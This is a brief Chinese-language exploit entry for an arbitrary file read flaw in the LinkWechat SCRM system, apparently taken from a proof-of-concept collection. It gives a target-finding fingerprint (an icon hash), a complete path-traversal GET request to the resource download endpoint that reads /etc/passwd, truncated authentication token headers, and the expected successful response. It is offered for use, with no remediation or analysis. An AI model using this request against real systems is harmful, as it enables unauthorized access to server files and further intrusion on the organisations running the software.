# LinkWechat-Scrm任意文件读取

- **系统**：LinkWechat　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`icon_hash="-1120452546"`
- **请求**：`GET /linkwechat-api/common/download/resource?name=/profile/../../../../../etc/passwd HTTP/1.1`
- **关键头**：`Cookie: Admin-Token=eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyX3R5cGUiOiIwMyIsInVzZXJfaWQiOjE2OCwibG9…`　`authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyX3R5cGUiOiIwMyIsInVzZXJf…`　`sec-fetch-user: ?1`
- **预期**：200　|　sbin